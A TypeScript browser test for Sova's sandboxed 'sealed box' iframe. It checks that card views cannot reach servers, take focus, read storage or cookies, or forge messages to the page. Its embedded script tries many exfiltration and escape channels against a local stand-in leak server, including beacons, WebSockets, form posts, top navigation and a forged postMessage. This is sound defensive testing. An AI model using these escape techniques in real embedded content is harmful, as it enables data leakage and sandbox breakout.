import assert from "node:assert/strict";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { test } from "node:test";
import { boxFocusGuard, CARD_BOX_LEFT, CARD_BOX_MESSAGE, CARD_SHELL_ATTRS, cardShellDoc, cardViewDoc, fromCardBox, type CardBoxMessage } from "../src/lib/card-box";
import { launchTourBrowser } from "./tours/browser";

/**
 * The sealed box's wall (§chat.transcript-cards/sealed-box), in a real Chromium: a view that tries
 * every way out reaches no listening server (neither one elsewhere nor Sova's own), takes no focus
 * from the page, has no storage or cookies and an opaque origin; what it posts through the box
 * reaches the page as its shell's, and what it posts to the page directly is refused. A view that
 * navigates itself goes nowhere and is stopped, with the box's error.
 */

const listen = (s: Server) => new Promise<number>((resolve) => s.listen(0, "127.0.0.1", () => resolve((s.address() as AddressInfo).port)));

/** Every way out that doesn't replace the view's own document; then a post through the box, and one past it. */
const everything = `
const tries = [];
const t = (name, fn) => { try { fn(); tries.push(name + ":ok"); } catch (e) { tries.push(name + ":threw"); } };
for (const base of [L, S]) {
  t("fetch", () => fetch(base + "/leak/fetch?x=1").catch(() => {}));
  t("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", base + "/leak/xhr"); x.send(); });
  t("beacon", () => navigator.sendBeacon(base + "/leak/beacon", "x"));
  t("socket", () => new WebSocket(base.replace("http", "ws") + "/leak/ws"));
  t("source", () => new EventSource(base + "/leak/sse"));
  t("img", () => { new Image().src = base + "/leak/img?x=1"; });
  t("img-tag", () => { const i = document.createElement("img"); i.src = base + "/leak/imgtag"; document.body.append(i); });
  t("style", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = base + "/leak/css"; document.head.append(l); });
  t("prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = base + "/leak/prefetch"; document.head.append(l); });
  t("font", () => { const st = document.createElement("style"); st.textContent = "@font-face{font-family:x;src:url(" + base + "/leak/font)} body{font-family:x}"; document.head.append(st); });
  t("bg", () => { document.body.style.backgroundImage = "url(" + base + "/leak/bg)"; });
  t("script", () => { const s = document.createElement("script"); s.src = base + "/leak/script"; document.head.append(s); });
  t("import", () => import(base + "/leak/import").catch(() => {}));
  t("frame", () => { const f = document.createElement("iframe"); f.src = base + "/leak/frame"; document.body.append(f); });
  t("frame-nav", () => { const f = document.createElement("iframe"); f.srcdoc = "<script>location.href=" + JSON.stringify(base + "/leak/grandchild") + "<\\/script>"; document.body.append(f); });
  t("worker", () => new Worker(base + "/leak/worker"));
  t("popup", () => window.open(base + "/leak/open"));
  t("form", () => { const f = document.createElement("form"); f.action = base + "/leak/form"; f.method = "post"; document.body.append(f); f.submit(); });
  t("top", () => { top.location.href = base + "/leak/top"; });
  t("parent", () => { parent.location.href = base + "/leak/parent"; });
  t("link-top", () => { const a = document.createElement("a"); a.href = base + "/leak/click-top"; a.target = "_top"; document.body.append(a); a.click(); });
  t("link-blank", () => { const a = document.createElement("a"); a.href = base + "/leak/click-blank"; a.target = "_blank"; document.body.append(a); a.click(); });
}
t("focus", () => { const i = document.createElement("input"); document.body.append(i); i.focus(); window.focus(); });
t("storage", () => localStorage.getItem("x"));
t("cookie", () => document.cookie);
globalThis.__sovaCardBox.post({ hello: "from the view", origin: String(origin), tries });
top.postMessage({ ${JSON.stringify(CARD_BOX_MESSAGE)}: 1, op: "api", msg: { forged: true } }, "*");
setTimeout(() => globalThis.__sovaCardBox.post({ done: true }), 300);
`;

/** Each way a view replaces its own document, one per round (the first one tried ends the view). */
const exits: Record<string, string> = {
  href: `location.href = L + "/leak/self?x=1";`,
  "href-sova": `location.href = S + "/leak/self?x=1";`,
  replace: `location.replace(L + "/leak/replace");`,
  assign: `location.assign(L + "/leak/assign");`,
  refresh: `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + L + "/leak/refresh"; document.head.append(m);`,
  link: `const a = document.createElement("a"); a.href = L + "/leak/click"; document.body.append(a); a.click();`,
  "window-open-self": `window.open(L + "/leak/open-self", "_self");`,
};

test("a view in the sealed box reaches no server, and only its shell's messages reach the page", async () => {
  const leaks: string[] = [];
  const leak = createServer((req, res) => {
    leaks.push(`elsewhere ${req.method} ${req.url}`);
    res.end("x");
  });
  const leakPort = await listen(leak);
  const shellDoc = cardShellDoc(cardViewDoc("body{margin:0}"));
  const page = createServer((req, res) => {
    if (req.url === "/favicon.ico") {
      res.statusCode = 404;
      res.end();
      return;
    }
    if (req.url !== "/") {
      leaks.push(`sova ${req.method} ${req.url}`);
      res.end("x");
      return;
    }
    const attrs = Object.entries(CARD_SHELL_ATTRS).map(([k, v]) => `${k}="${v.replace(/"/g, "&quot;")}"`).join(" ");
    res.setHeader("content-type", "text/html");
    res.end(`<!doctype html><html><body><input id="composer"><iframe id="box" ${attrs}></iframe><script>
      window.got = [];
      let ready;
      window.shellReady = new Promise((r) => (ready = r));
      const box = document.getElementById("box");
      document.getElementById("composer").focus();
      const guard = (${boxFocusGuard.toString()})(document, box, () => box.contentWindow.postMessage({ ${JSON.stringify(CARD_BOX_MESSAGE)}: 1, op: "focus?" }, "*"));
      addEventListener("message", (e) => {
        window.got.push({ fromShell: e.source === box.contentWindow, data: e.data });
        if (e.source === box.contentWindow && e.data && e.data.op === "focus") guard.onBoxFocus(e.data.user === true);
        if (e.source === box.contentWindow && e.data && e.data.op === "shell-ready") ready();
      });
      window.load = (code) => box.contentWindow.postMessage({ ${JSON.stringify(CARD_BOX_MESSAGE)}: 1, op: "load", css: "", init: { card: "cd_1" }, code }, "*");
      box.srcdoc = ${JSON.stringify(shellDoc).replace(/<\//g, "<\\/")};
    </script></body></html>`);
  });
  const pagePort = await listen(page);
  const prelude = `const L = "http://127.0.0.1:${leakPort}", S = "http://127.0.0.1:${pagePort}";\n`;
  const browser = await launchTourBrowser();
  try {
    const tab = await browser.newPage();
    const popups: string[] = [];
    tab.on("popup", (p) => popups.push(p.url()));
    await tab.goto(`http://127.0.0.1:${pagePort}/`);
    await tab.evaluate(() => (window as unknown as { shellReady: Promise<void> }).shellReady);
    type Got = { fromShell: boolean; data: unknown };
    const taken = async (): Promise<CardBoxMessage[]> => {
      const got = (await tab.evaluate(() => (window as unknown as { got: Got[] }).got)) as Got[];
      const shell = {};
      return got.map((g) => fromCardBox({ source: g.fromShell ? shell : {}, data: g.data }, shell)).filter((m): m is CardBoxMessage => m !== null);
    };
    const run = (code: string) => tab.evaluate((c) => (window as unknown as { load(c: string): void }).load(c), prelude + code);
    const clear = () => tab.evaluate(() => void ((window as unknown as { got: Got[] }).got = []));

    // Round 1: everything that keeps the view's document.
    await run(everything);
    await tab.waitForFunction(() => (window as unknown as { got: Got[] }).got.some((g) => (g.data as { msg?: { done?: boolean } })?.msg?.done), null, { timeout: 15_000 });
    const got = (await tab.evaluate(() => (window as unknown as { got: Got[] }).got)) as Got[];
    const first = await taken();
    const api = first.flatMap((m) => (m.op === "api" ? [m.msg as Record<string, unknown>] : []));
    assert.ok(got.some((g) => !g.fromShell && (g.data as { msg?: { forged?: boolean } })?.msg?.forged), "the view's direct post reached the page, from the view itself");
    assert.ok(!api.some((m) => m.forged), "and the page refused it: not its shell's");
    const hello = api.find((m) => m.hello) as { origin: string; tries: string[] } | undefined;
    assert.ok(hello, "the view's post came through its shell");
    assert.equal(hello.origin, "null", "the view's origin is opaque, never Sova's");
    assert.ok(hello.tries.includes("storage:threw") && hello.tries.includes("cookie:threw"), "no storage, no cookies");
    assert.ok(first.some((m) => m.op === "height"), "its height reached the page");
    assert.ok(!first.some((m) => m.op === "error"), "nothing in round 1 replaced the view's document");
    assert.equal(await tab.evaluate(() => document.activeElement?.id), "composer", `the view took no focus from the page: ${JSON.stringify(got.map((g) => [g.fromShell, (g.data as { op?: string; user?: boolean })?.op, (g.data as { user?: boolean })?.user]))}`);

    // Then each way of replacing its own document, each in a fresh view: stopped, nothing sent.
    for (const [name, exit] of Object.entries(exits)) {
      await clear();
      await run(`globalThis.__sovaCardBox.post({ round: ${JSON.stringify(name)} }); setTimeout(() => { ${exit} }, 20);`);
      await tab
        .waitForFunction((left) => (window as unknown as { got: Got[] }).got.some((g) => (g.data as { message?: string })?.message === left), CARD_BOX_LEFT, { timeout: 10_000 })
        .catch(() => assert.fail(`${name}: the view was not stopped`));
      const msgs = await taken();
      assert.ok(msgs.some((m) => m.op === "api" && (m.msg as { round?: string }).round === name), `${name}: the view ran`);
    }

    // Give any request that did leave time to land.
    await new Promise((r) => setTimeout(r, 500));
    assert.deepEqual(leaks, [], `requests left the box: ${leaks.join(", ")}`);
    assert.deepEqual(popups, []);
    assert.equal(tab.url(), `http://127.0.0.1:${pagePort}/`, "the page was never navigated");
    assert.equal(await tab.evaluate(() => document.activeElement?.id), "composer");

    // The guard puts back only focus the view took on its own: the user's click into it, or Tab
    // from the page, keeps it there.
    await clear();
    await run(`const b = document.createElement("button"); b.id = "go"; b.textContent = "Go"; document.body.append(b); b.onclick = () => globalThis.__sovaCardBox.post({ clicked: true });`);
    const view = tab.frameLocator("#box").frameLocator("iframe");
    await view.locator("#go").click();
    await tab.waitForFunction(() => (window as unknown as { got: Got[] }).got.some((g) => (g.data as { msg?: { clicked?: boolean } })?.msg?.clicked));
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await tab.evaluate(() => document.activeElement?.id), "box", "a click into the view keeps focus there");
    await tab.focus("#composer");
    await tab.keyboard.press("Tab");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await tab.evaluate(() => document.activeElement?.id), "box", "Tab moves into the box");
    assert.deepEqual(leaks, []);
  } finally {
    await browser.close();
    leak.close();
    page.close();
  }
});
